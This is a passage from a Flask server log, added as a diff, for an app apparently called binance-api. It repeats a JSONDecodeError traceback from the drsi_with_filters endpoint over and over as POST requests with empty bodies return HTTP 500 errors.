+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:13:23] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.003759
+(22236) accepted ('52.32.178.7', 51956)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:00] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004335
+(22236) accepted ('52.32.178.7', 51958)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:00] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.005183
+(22236) accepted ('34.212.75.30', 35686)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:00] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.006617
+(22236) accepted ('34.212.75.30', 35688)
+34.212.75.30 - - [12/Jul/2023 16:14:00] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001169
+(22236) accepted ('52.32.178.7', 52806)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:01] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.015500
+(22236) accepted ('52.32.178.7', 52810)
+(22236) accepted ('52.32.178.7', 52814)
+(22236) accepted ('52.32.178.7', 52816)
+52.32.178.7 - - [12/Jul/2023 16:14:01] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001169
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:01] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.034027
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:01] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.012600
+(22236) accepted ('52.32.178.7', 52966)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:02] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.008356
+(22236) accepted ('52.32.178.7', 52968)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:02] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.022347
+(22236) accepted ('34.212.75.30', 36632)
+(22236) accepted ('34.212.75.30', 36634)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:02] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.010698
+34.212.75.30 - - [12/Jul/2023 16:14:02] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001636
+(22236) accepted ('52.32.178.7', 53368)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:03] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.006257
+(22236) accepted ('34.212.75.30', 37014)
+34.212.75.30 - - [12/Jul/2023 16:14:03] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001496
+(22236) accepted ('52.32.178.7', 53376)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:03] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.007136
+(22236) accepted ('52.32.178.7', 53378)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:03] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.008298
+(22236) accepted ('52.32.178.7', 53782)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:06] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.007122
+(22236) accepted ('34.212.75.30', 37430)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
